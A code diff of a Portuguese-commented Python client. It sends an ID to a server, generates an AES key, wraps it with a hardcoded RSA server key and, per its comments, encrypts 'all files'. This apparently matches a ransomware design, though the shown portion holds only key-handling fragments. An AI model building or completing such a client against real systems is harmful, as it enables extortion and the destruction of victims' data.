@@ -10,7 +10,8 @@ import multiprocessing
 
 from gera_chaves_RSA import *
 from criptografa_descriptografa_arquivo_AES import *
-
+from rsa import *
+from desc_rsa import *
 '''
 
     COMUNICA COM O SERVIDOR ENVIANDO O SEU ID
@@ -106,34 +107,6 @@ def gera_chave_AES():
     f.close()
     return senha
 
-def criptografa_chave_AES(chave_publica_servidor):
-    f=open('keys/AES.txt','r')
-    chave_AES=f.read()
-    retorno=cipher(chave_AES,chave_publica_servidor[0],chave_publica_servidor[1])
-    f=open('keys/AES.txt','w')
-    for elemento in retorno:
-        f.write(str(elemento)+'\n')
-    f.close()
-
-def descriptografa_chave_AES():
-    f=open('keys/AES.txt','r')
-    of=open('keys/chave_publica.txt','r')
-    ifo=open('keys/chave_privada.txt','r')
-    chave_privada=ifo.readline()
-    n_cliente=of.readline()
-    chave_AES=f.read()
-
-    # LISTA COM a chave criptografada
-    chave_AES=chave_AES.split('\n')
-    novo=[]
-    for elemento in chave_AES:
-        try:
-            elemento=int(elemento)
-            novo.append(elemento)
-        except ValueError:
-            pass
-    AES_origin_key=descifra_AES(novo, n_cliente, chave_privada)
-    print(AES_origin_key)
 
 
 # MAIN
@@ -142,16 +115,15 @@ print('[*] chave AES gerada')
 # chave publica servidor
 serv_RSA=[1121,655]
 # gera_chaves_RSA.py
-valida()
-print('[*] chaves publicas e privada do cliente geradas')
 #menu() # -> criptografa tudo
-criptografa_chave_AES(serv_RSA)
+RSA_to_AES()
+#AES_to_RSA()
+print('[*] chave AES criptografado com RSA')
 
 '''
      USAR O RSA DA LIB CRYPTO -> https://www.youtube.com/watch?v=tXSb7O6fao8
 '''
 
-descriptografa_chave_AES()
     # criptografa todos os arquivos com AES
 
     # criptografa a chave AES
